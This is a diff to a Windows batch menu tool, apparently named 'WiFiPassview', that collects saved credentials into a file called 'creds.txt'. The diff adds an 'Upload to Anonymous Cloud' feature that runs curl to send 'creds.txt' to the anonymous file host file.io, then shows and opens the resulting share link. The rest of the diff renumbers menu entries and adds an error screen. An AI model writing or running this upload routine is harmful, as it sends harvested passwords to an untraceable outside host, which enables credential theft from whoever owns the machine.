@@ -342,22 +342,24 @@ echo # by %dev%
 echo # %divider%
 color %uicolor%
 echo #
-echo # Delete "creds.txt" ............ [1]
-echo # Locate "creds.txt" ............ [2]
-echo # Open "creds.txt" in Notepad ... [3]
-echo # Generate WLAN Report .......... [4]
-echo # Premium Version ............... [5]
-echo # Elris? Here I Am .............. [6]
-echo # Back to Main Menu ............. [7]
+echo # Delete "creds.txt" ......................... [1]
+echo # Locate "creds.txt" ......................... [2]
+echo # Open "creds.txt" in Notepad ................ [3]
+echo # Upload "creds.txt" to Anonymous Cloud ...... [4]
+echo # Generate WLAN Report ....................... [5]
+echo # Premium Version ............................ [6]
+echo # Elris? Here I Am ........................... [7]
+echo # Back to Main Menu .......................... [8]
 echo #
 set /p "options= # $WiFiPassview> " || set options=5
 if %options%==1 goto deleteCreds
 if %options%==2 goto locateCreds
 if %options%==3 goto notepadCreds
-if %options%==4 goto wlanreport
-if %options%==5 goto premium 
-if %options%==6 goto elris
-if %options%==7 goto mainMenu
+if %options%==4 goto uploadCreds
+if %options%==5 goto wlanreport
+if %options%==6 goto premium 
+if %options%==7 goto elris
+if %options%==8 goto mainMenu
 goto fail4
 pause>null
 
@@ -407,6 +409,86 @@ start notepad creds.txt
 goto options
 
 rem =============================
+rem Options: Upload Creds to Anonymous Cloud
+rem =============================
+:uploadCreds
+del null
+type creds.txt
+if %errorlevel%==1 goto fail2
+cls
+title %appname% %appvers% - %appstat% [Upload Collected Creds]
+color %infouicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # [Upload Creds to Anonymous Cloud]
+echo #
+echo # This feature will upload "creds.txt" to Anonymous Cloud powered by file.io
+echo # 
+echo # Continue Upload ....... [1]
+echo # Back to Options ....... [2]
+echo #
+set /p "uploadCreds= # $WiFiPassview> " || set uploadCreds=2
+if %uploadCreds%==1 goto continueUpload
+if %uploadCreds%==2 goto options
+goto fail5
+pause>null
+
+rem =============================
+rem Upload Creds to Anonymous Cloud: Continue Upload
+rem =============================
+:continueUpload
+del null
+type creds.txt
+if %errorlevel%==1 goto fail2
+cls
+title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Uploading...
+curl -F "file=@creds.txt" https://file.io > logs.txt
+cls
+title %appname% %appvers% - %appstat% [Uploading Creds to Cloud]
+color %uicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Uploaded!
+echo # Generating link...
+set /p url=<logs.txt
+del logs.txt
+echo # Got it!
+echo # Here's your shortlink...
+echo # %divider%
+echo #
+echo # Key: %url:~23,8% [Remember]
+echo # Link: %url:~41,24%
+echo #
+echo # %divider%
+echo #
+echo # Open it to browser?
+echo # Yes ....... [1]
+echo # No ........ [2]
+echo #
+set /p "browseCreds= # $WiFiPassview> " || set browseCreds=2
+if %browseCreds%==1 goto browsedCreds
+if %browseCreds%==2 goto options
+pause>null
+
+rem =============================
+rem Upload Creds to Anonymous Cloud: Browse Creds
+rem =============================
+:browsedCreds
+del null
+start %url:~41,24%
+goto options
+
+rem =============================
 rem Options: Generate WLAN Report
 rem =============================
 :wlanreport
@@ -420,7 +502,7 @@ echo # by %dev%
 echo # %divider%
 echo # [Generate WLAN Report]
 echo #
-echo # This tool will execute a command to generate WLAN Report for this machine.
+echo # This feature will execute a command to generate WLAN Report for this machine.
 echo #
 echo # Note: This feature requires an administrative permissions to proceed.
 echo # Close this program and run it as administrator to be able to work!
@@ -588,6 +670,25 @@ echo #
 echo # Press any key to continue... (except power button lol)
 pause>null
 goto mainMenu
+
+rem =============================
+rem Program Error
+rem =============================
+:fail5
+del null
+cls
+title %appname% %appvers% - %appstat% [Error]
+color %erruicolor%
+echo # %divider%
+echo # %appname% %appvers% - %appstat%
+echo # by %dev%
+echo # %divider%
+echo # Invalid option! Please try again...
+echo # %divider%
+echo #
+echo # Press any key to continue... (except power button lol)
+pause>null
+goto options
 
 rem =============================
 rem Exit Option Function
